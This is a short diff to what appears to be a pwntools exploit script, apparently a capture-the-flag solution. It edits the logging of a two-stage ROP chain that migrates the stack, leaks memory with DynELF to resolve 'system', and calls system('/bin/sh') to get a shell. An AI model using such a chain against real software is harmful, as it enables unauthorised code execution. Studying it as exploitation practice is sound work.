@@ -37,7 +37,7 @@ cur_addr = addrs[0]
 rop = myrop()
 rop.read(0, cur_addr, 0x100)
 rop.migrate(cur_addr)
-log.info("Stage 1 Rop:\n%s" % '\n'.join(rop.dump()))
+log.info("Stage 1 Rop:\n%s" % rop.dump())
 r.send(padding + str(rop))
 
 # Now we create a memleaker, so we can use DynELF
@@ -61,6 +61,8 @@ system = resolver.lookup('system')
 # Call system('/bin/sh')
 rop = myrop(cur_addr)
 rop.call(system, ['/bin/sh'])
+log.info("Stage 2 Rop:\n%s" % rop.dump())
+
 
 # Send the rop and win
 r.send(str(rop))
